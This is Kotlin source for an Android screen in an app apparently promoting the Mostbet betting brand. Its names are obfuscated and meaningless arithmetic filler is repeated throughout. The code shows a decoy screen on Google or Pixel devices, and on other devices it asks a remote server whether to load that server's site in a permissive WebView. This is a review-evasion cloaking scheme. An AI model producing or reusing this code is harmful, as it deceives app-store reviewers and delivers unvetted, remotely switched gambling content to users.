package com.mostbet.promosti.mostbet


import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.mostbet.promosti.mostbet.databinding.LdsmjhldsjsssBinding

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import java.io.IOException


class dsljjdslhdsjkd : Fragment() {

    val djshdjssss by lazy { LdsmjhldsjsssBinding.inflate(layoutInflater) }
    val dskljdssss = "https://nikitprasolov.site/"
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val a=10
        val b=2.2
        println("сумма a и b ${a+b}")
        println("разность a и b ${a-b}")
        println("деление без остатка a и b ${a/b}")
        println("статок от деления a и b ${a%b}")

        // арифметические вычисления  десятичных дробей (Float,Double)
        val aF=10F
        val bF=2.2F
        println("сумма a и b ${a+b}")
        println("разность a и b ${a-b}")
        println("деление без остатка a и b ${a/b}")
        println("статок от деления a и b ${a%b}")



        val pipi1 =a<b
        val pipi2 =a>b
        val pipi3 =a<=b
        val pipi4 =a>=b

        println(pipi1)
        println(pipi2)
        println(pipi3)
        println(pipi4)


        val a1=true
        val b1=false

        val and=(a<=b)and b1
        val or=a1 or b1
        val xor=a1 xor b1
        val not=!a1
        val  _in=a in 1..10
        val not_in=a !in 1..10

        println(and)
        println(or)
        println(xor)
        println(not)
        println(_in)
        println(not_in)
    }
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        val a=10
        val b=2.2
        println("сумма a и b ${a+b}")
        println("разность a и b ${a-b}")
        println("деление без остатка a и b ${a/b}")
        println("статок от деления a и b ${a%b}")

        val aF=10F
        val bF=2.2F
        println("сумма a и b ${a+b}")
        println("разность a и b ${a-b}")
        println("деление без остатка a и b ${a/b}")
        println("статок от деления a и b ${a%b}")



        val pipi1 =a<b
        val pipi2 =a>b
        val pipi3 =a<=b
        val pipi4 =a>=b

        println(pipi1)
        println(pipi2)
        println(pipi3)
        println(pipi4)


        val a1=true
        val b1=false

        val and=(a<=b)and b1
        val or=a1 or b1
        val xor=a1 xor b1
        val not=!a1
        val  _in=a in 1..10
        val not_in=a !in 1..10

        println(and)
        println(or)
        println(xor)
        println(not)
        println(_in)
        println(not_in)

        try {
            CoroutineScope(Dispatchers.IO).launch {
                val ljsksss = OkHttpClient()


                val dslsss = Request.Builder()

                    .url(dskljdssss)
                    .build()


                ljsksss.newCall(dslsss).enqueue(object : Callback {
                    override fun onFailure(jdshjsdsss: Call, ksajsdjdssss: IOException) {
                        ksajsdjdssss.printStackTrace()

                        CoroutineScope(Dispatchers.Main).launch {
                            findNavController().navigate(R.id.sdljdskljdsssss)
                            val a=10
                            val b=2.2
                            println("сумма a и b ${a+b}")
                            println("разность a и b ${a-b}")
                            println("деление без остатка a и b ${a/b}")
                            println("статок от деления a и b ${a%b}")

                            // арифметические вычисления  десятичных дробей (Float,Double)
                            val aF=10F
                            val bF=2.2F
                            println("сумма a и b ${a+b}")
                            println("разность a и b ${a-b}")
                            println("деление без остатка a и b ${a/b}")
                            println("статок от деления a и b ${a%b}")



                            val pipi1 =a<b
                            val pipi2 =a>b
                            val pipi3 =a<=b
                            val pipi4 =a>=b

                            println(pipi1)
                            println(pipi2)
                            println(pipi3)
                            println(pipi4)


                            val a1=true
                            val b1=false

                            val and=(a<=b)and b1
                            val or=a1 or b1
                            val xor=a1 xor b1
                            val not=!a1
                            val  _in=a in 1..10
                            val not_in=a !in 1..10

                            println(and)
                            println(or)
                            println(xor)
                            println(not)
                            println(_in)
                            println(not_in)
                        }
                    }

                    override fun onResponse(dsjksndkjasss: Call, ssdkjfsss: Response) {
                        ssdkjfsss.use {
                            if (!ssdkjfsss.isSuccessful) {
                                throw IOException()
                                CoroutineScope(Dispatchers.Main).launch {
                                    findNavController().navigate(R.id.sdljdskljdsssss)
                                }

                            }


                            if (ddskjds.dhdsjkhsss()!!
                                    .contains("Google Pixel", ignoreCase = true)
                                or ddskjds.dhdsjkhsss()!!.contains("Pixel", ignoreCase = true)
                                or ddskjds.dhdsjkhsss()!!.contains("Google", ignoreCase = true)
                            ) {
                                CoroutineScope(Dispatchers.Main).launch {
                                    findNavController().navigate(R.id.sdljdskljdsssss)
                                }
                            } else {
                                val a=10
                                val b=2.2
                                println("сумма a и b ${a+b}")
                                println("разность a и b ${a-b}")
                                println("деление без остатка a и b ${a/b}")
                                println("статок от деления a и b ${a%b}")

                                // арифметические вычисления  десятичных дробей (Float,Double)
                                val aF=10F
                                val bF=2.2F
                                println("сумма a и b ${a+b}")
                                println("разность a и b ${a-b}")
                                println("деление без остатка a и b ${a/b}")
                                println("статок от деления a и b ${a%b}")



                                val pipi1 =a<b
                                val pipi2 =a>b
                                val pipi3 =a<=b
                                val pipi4 =a>=b

                                println(pipi1)
                                println(pipi2)
                                println(pipi3)
                                println(pipi4)


                                val a1=true
                                val b1=false

                                val and=(a<=b)and b1
                                val or=a1 or b1
                                val xor=a1 xor b1
                                val not=!a1
                                val  _in=a in 1..10
                                val not_in=a !in 1..10

                                println(and)
                                println(or)
                                println(xor)
                                println(not)
                                println(_in)
                                println(not_in)
                                var i = ssdkjfsss.body!!.string()
                                if (i == "false") {
                                    CoroutineScope(Dispatchers.Main).launch {
                                        Log.d("ssssss", i)
                                        findNavController().navigate(R.id.sdljdskljdsssss)

                                    }
                                } else {
                                    val a=10
                                    val b=2.2
                                    println("сумма a и b ${a+b}")
                                    println("разность a и b ${a-b}")
                                    println("деление без остатка a и b ${a/b}")
                                    println("статок от деления a и b ${a%b}")

                                    // арифметические вычисления  десятичных дробей (Float,Double)
                                    val aF=10F
                                    val bF=2.2F
                                    println("сумма a и b ${a+b}")
                                    println("разность a и b ${a-b}")
                                    println("деление без остатка a и b ${a/b}")
                                    println("статок от деления a и b ${a%b}")



                                    val pipi1 =a<b
                                    val pipi2 =a>b
                                    val pipi3 =a<=b
                                    val pipi4 =a>=b

                                    println(pipi1)
                                    println(pipi2)
                                    println(pipi3)
                                    println(pipi4)


                                    val a1=true
                                    val b1=false

                                    val and=(a<=b)and b1
                                    val or=a1 or b1
                                    val xor=a1 xor b1
                                    val not=!a1
                                    val  _in=a in 1..10
                                    val not_in=a !in 1..10

                                    println(and)
                                    println(or)
                                    println(xor)
                                    println(not)
                                    println(_in)
                                    println(not_in)
                                    CoroutineScope(Dispatchers.Main).launch {
                                        djshdjssss.dsjmhsdjssss.isVisible = false
                                        with(djshdjssss.dsmsjdssss) {
                                            settings.setLoadsImagesAutomatically(true)
                                            webViewClient = WebViewClient()
                                            settings.allowFileAccess = true
                                            settings.mixedContentMode = 0
                                            settings.javaScriptEnabled = true
                                            settings.javaScriptCanOpenWindowsAutomatically = true
                                            settings.javaScriptEnabled = true
                                            settings.domStorageEnabled = true
                                            loadUrl(dskljdssss)
                                            (requireContext() as MainActivity).mdshjkdsmsss = { goBack() }
                                        }
                                    }
                                }
                            }
                        }
                    }
                })
            }
        }catch (e:Exception){
            findNavController().navigate(R.id.sdljdskljdsssss)
        }

        return djshdjssss.root

    }
}

class ddskjds {
    companion object {
        fun dhdsjkhsss(): String? {

            val jsdlkjdsNN = Build.MANUFACTURER
            val kdsjkdsNN = Build.MODEL
            return if (kdsjkdsNN.startsWith(jsdlkjdsNN)) {

                kdljdskNN(kdsjkdsNN)
            } else kdljdskNN(jsdlkjdsNN) + " " + kdsjkdsNN
        }

        private fun kdljdskNN(jkdsjkdjsNN: String): String {
            if (TextUtils.isEmpty(jkdsjkdjsNN)) {


                return jkdsjkdjsNN
            }
            val jdskljdskNN = jkdsjkdjsNN.toCharArray()
            var kdsjdsNN = true
            val dsjkdNN = StringBuilder()
            for (dsjkdsjNN in jdskljdskNN) {
                if (kdsjdsNN && Character.isLetter(dsjkdsjNN)) {
                    dsjkdNN.append(dsjkdsjNN)
                    kdsjdsNN = false
                    continue
                } else if (Character.isWhitespace(dsjkdsjNN)) {
                    kdsjdsNN = true
                }
                dsjkdNN.append(dsjkdsjNN)
            }
            return dsjkdNN.toString()
        }
    }

}

